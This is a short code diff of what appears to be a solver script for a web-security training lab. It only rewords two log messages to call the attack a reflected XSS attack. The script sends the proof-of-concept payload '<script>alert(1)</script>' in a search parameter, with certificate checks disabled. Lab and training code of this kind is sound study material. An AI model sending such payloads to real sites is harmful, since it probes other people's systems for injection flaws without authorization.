@@ -51,12 +51,12 @@ def verify_lab_solved(url):
 def solve_lab(url, proxies):
     params = {"search": "<script>alert(1)</script>"}
     print_info(
-        f'Performing XSS attack by visiting "{url}" with the following parameters:'
+        f'Performing reflected XSS attack by visiting "{url}" with the following parameters:'
     )
     print(params)
 
     requests.get(url, params=params, proxies=proxies, verify=False)
-    print_success("XSS attack performed.\n")
+    print_success("Reflected XSS attack performed.\n")
 
 
 def main():
